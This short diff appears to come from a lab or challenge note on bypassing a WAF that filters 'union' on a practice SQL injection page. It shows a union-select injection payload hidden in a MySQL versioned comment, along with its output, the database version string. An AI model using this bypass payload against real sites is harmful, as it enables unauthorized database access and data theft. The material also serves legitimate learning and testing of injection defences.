@@ -1,7 +1,4 @@
 http://root0x00.altervista.org/sqli/waf2.php
 
-* Filtered
-  {union/i}
-
 ?id=0' /*!12345union*/ select 1,2,3,4,version() %23
 >> 5.6.33-log
